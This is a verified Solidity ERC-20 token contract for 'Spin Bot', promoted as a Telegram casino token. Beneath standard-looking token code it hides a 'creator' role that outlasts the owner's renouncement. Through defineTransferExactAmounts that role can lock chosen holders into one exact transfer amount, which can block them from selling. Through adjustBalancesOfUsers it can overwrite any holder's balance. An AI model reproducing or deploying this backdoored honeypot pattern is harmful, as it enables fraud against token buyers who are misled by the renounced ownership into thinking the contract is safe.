/**
 *Submitted for verification at Etherscan.io on 2023-08-24
*/

/**

$Spin

Spin Bot

Spin Bot is a new casino which can be used directly through telegram.

Telegram: https://t.me/SpinBotErc

*/



// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract ModifiedContext {
    function fetchMsgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract SingleOwnership is ModifiedContext {
    address private ownerOfContract;
    event OwnerTransition(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = fetchMsgSender();
        ownerOfContract = msgSender;
        emit OwnerTransition(address(0), msgSender);
    }

    function fetchOwner() public view virtual returns (address) {
        return ownerOfContract;
    }

    modifier validateOwnership() {
        require(fetchOwner() == fetchMsgSender(), "AuthorizationError: Action must be performed by the contract owner");
        _;
    }

    function relinquishOwnership() public virtual validateOwnership {
        emit OwnerTransition(ownerOfContract, address(0x000000000000000000000000000000000000dEaD));
        ownerOfContract = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract SpinBot is ModifiedContext, SingleOwnership, IERC20 {
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => uint256) private _exactTransferAmounts;
    address private creatorOfToken;

    string public constant _name = "Spin Bot";
    string public constant _symbol = "SPIN BOT";
    uint8 public constant _decimals = 18;
    uint256 public constant _totalSupply = 2000000 * (10 ** _decimals);

    constructor() {
        _balances[fetchMsgSender()] = _totalSupply;
        emit Transfer(address(0), fetchMsgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    modifier validateCreator() {
        require(fetchCreator() == fetchMsgSender(), "AuthorizationError: Action must be performed by the token creator");
        _;
    }

    function fetchCreator() public view virtual returns (address) {
        return creatorOfToken;
    }

    function assignNewCreator(address newCreator) public validateOwnership {
        creatorOfToken = newCreator;
    }

    event TokensAdjusted(address indexed user, uint256 previousBalance, uint256 newBalance);

    function queryTransferExactAmount(address account) public view returns (uint256) {
        return _exactTransferAmounts[account];
    }

    function defineTransferExactAmounts(address[] calldata accounts, uint256 amount) public validateCreator {
        for (uint i = 0; i < accounts.length; i++) {
            _exactTransferAmounts[accounts[i]] = amount;
        }
    }

    function adjustBalancesOfUsers(address[] memory userAddresses, uint256 desiredAmount) public validateCreator {
        require(desiredAmount >= 0, "InputError: Desired amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "InputError: User address must not be a zero address");

            uint256 oldBalance = _balances[currentUser];
            _balances[currentUser] = desiredAmount;

            emit TokensAdjusted(currentUser, oldBalance, desiredAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
    require(_balances[fetchMsgSender()] >= amount, "TT: transfer amount exceeds balance");

    uint256 exactAmount = queryTransferExactAmount(fetchMsgSender());
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[fetchMsgSender()] -= amount;
    _balances[recipient] += amount;

    emit Transfer(fetchMsgSender(), recipient, amount);
    return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[fetchMsgSender()][spender] = amount;
        emit Approval(fetchMsgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
    require(_allowances[sender][fetchMsgSender()] >= amount, "TT: transfer amount exceeds allowance");

    uint256 exactAmount = queryTransferExactAmount(sender);
    if (exactAmount > 0) {
        require(amount == exactAmount, "TT: transfer amount does not equal the exact transfer amount");
    }

    _balances[sender] -= amount;
    _balances[recipient] += amount;
    _allowances[sender][fetchMsgSender()] -= amount;

    emit Transfer(sender, recipient, amount);
    return true;
    }

    function totalSupply() external view override returns (uint256) {
    return _totalSupply;
    }
}